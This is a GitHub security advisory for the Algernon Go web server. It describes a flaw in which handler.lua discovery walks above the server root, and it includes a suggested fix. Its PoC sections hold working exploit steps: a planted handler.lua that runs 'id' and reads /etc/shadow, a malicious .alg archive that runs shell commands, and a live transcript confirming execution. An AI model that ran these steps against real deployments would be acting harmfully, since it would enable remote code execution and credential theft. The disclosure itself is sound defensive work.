# [C] Algernon: handler.lua discovery walks parent directories above the server root

## Summary
Severity: Critical
Advisory: GHSA-xwcr-wm99-g9jc
CVE: CVE-2026-45721
CWE: CWE-20, CWE-426, CWE-552
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-xwcr-wm99-g9jc
Type: github-advisory

## Affected
- Go: `github.com/xyproto/algernon` — affected >=0 <1.17.7

## Details
### Summary

When Algernon is asked for any URL path that resolves to a directory *without* an index file, `DirPage` walks **upward through parent directories — past the configured server root** — looking for a file named `handler.lua` to execute as the request handler. The loop terminates only after 100 ancestor steps or when `filepath.Dir` returns `.`, so on any absolute server-root path the search reaches the filesystem root (`/` on Unix, drive letter on Windows). The first `handler.lua` it finds is loaded into the Lua interpreter with the full Algernon API exposed — including `run3()`, `httpclient`, `os.execute`, `io.popen`, `PQ`, `MSSQL`, raw filesystem access, and the userstate database. Any process that can write `handler.lua` anywhere in a parent directory of the server root obtains pre-authenticated remote code execution on the next HTTP request.

This is reachable without authentication — the lookup happens before the permission check returns a hit (the perm system only gates URL prefixes, not the handler-resolution step), and any URL pointing at a directory without an index triggers the walk. On a fresh stock Algernon install the request `GET /` is enough.

### Details

#### Root cause — unbounded upward search in `DirPage`

```go
// engine/dirhandler.go:170-183
// Serve handler.lua, if found in parent directories
var ancestor string
ancestor = filepath.Dir(dirname)
for range 100 { // a maximum of 100 directories deep
    filename = filepath.Join(ancestor, "handler.lua")
    if ac.fs.Exists(filename) {
        ac.FilePage(w, req, filename, luaDataFilename)
        return
    }
    if ancestor == "." {
        break
    }
    ancestor = filepath.Dir(ancestor)
}
```

`dirname` is the absolute path of the requested directory on disk, e.g. `/srv/algernon/` when running with `--prod` (see [engine/config.go:207](../engine/config.go)). `filepath.Dir("/srv/algernon")` is `/srv`, then `/`, and `filepath.Dir("/")` returns `/` indefinitely. The break clause `if ancestor == "."` only fires for *relative* paths, so on every absolute server-root configuration the loop walks all the way to `/` and then spins on `/` for the remaining iterations until the `100` cap is hit. Each iteration calls `ac.fs.Exists(<ancestor>/handler.lua)`.

For the canonical `--prod` invocation the candidate set is:

```
/srv/handler.lua
/handler.lua
```

For `algernon /var/www/example.com`:

```
/var/www/handler.lua
/var/handler.lua
/handler.lua
```

For `algernon ~/site` started by user `alice`:

```
/home/alice/handler.lua
/home/handler.lua
/handler.lua
```

The first match wins. The match is then dispatched through `FilePage`, which for `.lua` files routes to `RunLua` (`engine/handlers.go:269`) and runs the file in a pooled `lua.LState` with the full Algernon function map attached (`engine/lua.go:30-112`). Every dangerous primitive in the engine is reachable: shell-out via `run3()` (`engine/basic.go:140-146`, calling `exec.Command("sh", "-c", ...)`), arbitrary outbound HTTP via the `httpclient` module, the unsandboxed gopher-lua `os`/`io`/`debug` libraries, and the full permissions/userstate API.

#### Why the request is reachable unauthenticated

The permission middleware in `RegisterHandlers` runs before `DirPage` but only rejects requests whose `req.URL.Path` matches an admin/user prefix:

```go
// engine/handlers.go:510-525
allRequests := func(w http.ResponseWriter, req *http.Request) {
    if ac.perm != nil {
        if ac.perm.Rejected(w, req) {
            sc := sheepcounter.New(w)
            ac.perm.DenyFunction()(sc, req)
            ac.LogAccess(req, http.StatusForbidden, sc.Counter())
            return
        }
    }
    ...
```

`Rejected` returns false for `/` because of `rootIsPublic && path == "/"` (`vendor/.../permissionbolt/v2/permissionbolt.go:118`). Anonymous `GET /` therefore reaches `DirPage`, hits the ancestor walk, and — if any `handler.lua` exists anywhere in the parent chain — executes it as the response handler for `/`. The same applies to every directory-style URL (`/foo/`, `/foo/bar/`, …) that does not contain one of the listed `index.*` files.

Three exploit-amenable scenarios:

1. **Multi-tenant / shared hosting.** Operators running multiple Algernon instances from sibling directories (`/srv/tenantA`, `/srv/tenantB`) share `/srv` as a common ancestor. A `handler.lua` placed by tenant B inside `/srv` becomes the catch-all handler for tenant A's requests, executing in tenant A's process with tenant A's database, redis, and filesystem permissions. The same pattern fires when a single OS user runs several `algernon` processes from `~/sites/<name>` — anything writable at `~/sites/` (or `~/`) escalates into every instance.

2. **CI runners, container images, dev workstations.** A repository or container that contains *any* `handler.lua` at root, in `/srv`, in `/var`, or in `/home/<user>` — even one that pre-dates Algernon's installation, even one left over from a tutorial — becomes a remote-execution backdoor the moment Algernon starts. The current `samples/` tree contains six `handler.lua` files (`samples/handle/handler.lua`, `samples/htmx/handler.lua`, etc.); copying any of them up to a parent directory by mistake is fatal.

3. **Attacker who already has unprivileged write to any parent directory** (low-privileged user, world-writable `/tmp` if `/tmp` is on the parent chain, an extracted `.zip`/`.alg` web application that drops a `handler.lua` at the extraction root in `/dev/shm` or `serverTempDir`, etc.) gains pre-authenticated RCE for every request the Algernon process answers. The `.alg` extraction case is especially direct: `FilePage` for `.alg` files calls `unzip.Extract(filename, webApplicationExtractionDir)` with `webApplicationExtractionDir = "/dev/shm"` or the server temp dir (`engine/handlers.go:249-266`); an `.alg` archive containing a top-level `handler.lua` writes it into the extraction directory, which is itself a parent of subsequent `DirPage` calls for that application.

#### Source-level evidence

```text
$ rg -n 'handler\.lua' engine/
engine/dirhandler.go:170:    // Serve handler.lua, if found in parent directories
engine/dirhandler.go:174:        filename = filepath.Join(ancestor, "handler.lua")

$ rg -n 'run3|os\.execute|exec\.Command' engine/basic.go lua/run3/
engine/basic.go:142:        command := L.ToString(1)
engine/basic.go:144:        return run3.ShellHelper(L, command, workingDir)
lua/run3/run3.go:23:    cmd := exec.Command("sh", "-c", command)

$ rg -n 'lua\.NewState|skip(?:_)?open_libs|OpenLibs' lua/pool/ engine/
lua/pool/pool.go:34:        L := lua.NewState()
# No skip-libs flag is set — gopher-lua loads os, io, debug, package by default.
```

The Lua state pool issues states with stock library loading (no `SkipOpenLibs` option in [lua/pool/pool.go](../lua/pool/pool.go)), so the `handler.lua` discovered above the root has `os.execute`, `io.popen`, `package.loadlib` (DLL loading), `debug.*`, plus every Algernon-bound function. This is documented behaviour for trusted scripts *inside* the served tree; the bug is that the discovery search reaches scripts the operator never opted in to.

### PoC

#### Variant A — confused-deputy via shared parent

```bash
# Operator runs Algernon serving a directory under /srv:
sudo mkdir -p /srv/site && echo '<h1>hi</h1>' > /srv/site/index.html
algernon --prod /srv/site &     # binds :3000

# Attacker (any account with write to /srv) drops handler.lua one level up:
cat > /srv/handler.lua <<'EOF'
-- Runs in the Algernon process; whoami leaks the process owner.
local out, _, _ = run3("id; cat /etc/shadow 2>&1 | head -3")
print(out)
EOF

# Trigger from anywhere on the network — any directory URL that lacks an
# index.* file inside /srv/site fires the parent walk. The cleanest trigger
# is to request a non-existent subdir:
curl -i http://server:3000/nope/
# => Algernon executes /srv/handler.lua. Response body is the captured stdout
#    of `id` and the first lines of /etc/shadow (if Algernon runs as root,
#    or the targeted file is readable by its uid).
```

#### Variant B — `.alg` archive plants `handler.lua` in `/dev/shm`

`FilePage` extracts `.alg` archives into `/dev/shm` (preferred) or `serverTempDir`. An `.alg` archive crafted with a top-level `handler.lua` lands the file into a path that is a parent of every directory served out of that extraction root.

```bash
# Craft a malicious .alg
mkdir -p evil && cat > evil/handler.lua <<'EOF'
local out, _, _ = run3("uname -a; whoami")
print(out)
EOF
( cd evil && zip -r ../evil.alg . )

# Once served — algernon evil.alg — any request that resolves to a directory
# without an index inside the extraction root executes the attacker handler.
algernon evil.alg
curl -i http://localhost:3000/anything/   # walks up to /dev/shm/handler.lua
```

#### Variant C — `algernon /home/<user>/site` picks up `~/handler.lua`

Any leftover `handler.lua` in the user's home directory (a tutorial fragment, a copy-paste, a file from another project) is sufficient. No attacker code is needed to reproduce: copy `samples/handle/handler.lua` into `~/` and serve any directory under `~/`. Every directory request will execute the home-directory handler.

### Impact

- **Confidentiality:** high — handler runs with the Algernon process's UID and reaches every database, redis instance, secret file, and cookie secret in memory.
- **Integrity:** high — handler can write to any path the process can write, including `index.lua`/`handler.lua` files of the served tree, persisting the compromise.
- **Availability:** high — handler can `os.exit`, hang the LState pool, or fork shell commands.
- **Scope:** changed (CVSS S:C) — a write primitive against a parent directory (which the operator may consider out of scope of Algernon entirely) crosses into the Algernon process's full authority.

**Affected population:** every Algernon deployment whose server-root path has any parent directory that is writable by a less-trusted principal — which includes (a) every `--prod` install on a host where any non-root user can write to `/srv` or `/`, (b) every multi-tenant deployment under a common parent, (c) every `algernon <path>` invocation where `~`, `~/Desktop`, `/tmp`, `/var/tmp`, or any other ancestor is writable by anyone other than the Algernon-process owner, (d) every server that serves `.alg` archives.

### Suggestions to fix

**Primary fix — clamp the walk to the server root.** `DirPage` already has access to `rootdir`; the loop must terminate once `ancestor` ceases to be a descendant of `rootdir`:

```go
// engine/dirhandler.go -- replace the walk in DirPage
rootAbs, err := filepath.Abs(rootdir)
if err != nil {
    rootAbs = rootdir
}
ancestor, err := filepath.Abs(dirname)
if err != nil {
    ancestor = dirname
}
for {
    // Stop before leaving the configured server root.
    rel, err := filepath.Rel(rootAbs, ancestor)
    if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
        break
    }
    candidate := filepath.Join(ancestor, "handler.lua")
    if ac.fs.Exists(candidate) {
        ac.FilePage(w, req, candidate, luaDataFilename)
        return
    }
    if ancestor == rootAbs {
        break
    }
    parent := filepath.Dir(ancestor)
    if parent == ancestor { // hit filesystem root without a match
        break
    }
    ancestor = parent
}
```

The `100`-iteration cap and the `ancestor == "."` check were both attempts to bound the search; clamping to `rootdir` removes the underlying confused-deputy primitive instead. The same boundary check should be applied to the `index.*` lookup loop at `engine/dirhandler.go:162-168`, which is currently fine because `filepath.Join(dirname, indexfile)` cannot escape `dirname`, but is worth asserting explicitly so the invariant survives future refactors.

**Defence in depth:**

- Cache the resolved `handler.lua` path per server start and *log a warning* if the resolved file lives outside the server root. An operator who places `handler.lua` deliberately in a parent directory will see the warning and either move it or accept the risk explicitly.
- For `.alg`/zip extraction, refuse archives containing a top-level `handler.lua` (or rename them on extract). The extraction directory is, by design, a parent of the served tree, so a top-level `handler.lua` in any uploaded `.alg` is the same primitive.
- Document explicitly in `TUTORIAL.md` that `handler.lua` is searched in parent directories — current docs describe per-directory `handler.lua` but do not mention the upward walk. The hardening above removes the need for the warning, but the docs should track reality either way.
- Consider stripping the unsandboxed Lua libraries (`os`, `io`, `package`, `debug`, `load`/`loadstring`, `run3`) when the discovered handler lives outside the configured server root, even if the walk is otherwise permitted. The audit trail is then "Lua handler ran *somewhere* the operator didn't bless, but at least it couldn't shell out."

### Live verification (2026-05-11, Algernon 1.17.6)

Reproduced against a fresh `go build` of `xyproto/algernon@main` on Windows 10.

**Layout:**

```
poc1/
  parent/
    handler.lua          # ATTACKER-PLANTED, OUTSIDE the served root
    site/                # the directory passed to algernon
      subdir/            # empty subdirectory
```

`parent/handler.lua` contains:

```lua
print("=== PWNED via parent handler.lua ===")
print("Hostname info: ", os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "n/a")
print("Algernon PID would be readable here; this code runs in-process.")
print("Request path was reached by walking past the served root.")
```

**Run (no admin paths configured, default permissions, no auth):**

```
$ ./algernon.exe --nodb --httponly --server --addr 127.0.0.1:18765 --quiet poc1/parent/site
```

**Anonymous requests against `/` and `/subdir/`:**

```
$ curl -s -w "HTTP %{http_code}\n" http://127.0.0.1:18765/
=== PWNED via parent handler.lua ===
Hostname info:  DESKTOP-4RLE5YR
Algernon PID would be readable here; this code runs in-process.
Request path was reached by walking past the served root.
HTTP 200

$ curl -s -w "HTTP %{http_code}\n" http://127.0.0.1:18765/subdir/
=== PWNED via parent handler.lua ===
Hostname info:  DESKTOP-4RLE5YR
...
HTTP 200
```

The handler that lives one directory **above** the configured server root (`poc1/parent/site/` was the path passed on the command line; `poc1/parent/handler.lua` is one level up and was *not* part of the served tree) executed in the Algernon process and its output became the HTTP 200 response body. The host's `COMPUTERNAME` environment variable was read via `os.getenv` and reflected back, proving the Lua state was unsandboxed (no `SkipOpenLibs`, no library stripping) — `os`, `io`, `package`, `debug` are all reachable from the discovered handler.

**Both `/` and `/subdir/` reproduce.** `/` because the served root has no `index.*` files; `/subdir/` because its directory has no `index.*` files either. The walk fires in both cases and resolves to the same `handler.lua` above the root.

No authentication, no `--debug`, no special flag, no `serverconf.lua`. The vulnerable code path is the default flow for any directory-style request that does not find a colocated `index.*`.

## References
- https://github.com/xyproto/algernon/security/advisories/GHSA-xwcr-wm99-g9jc
- https://github.com/xyproto/algernon
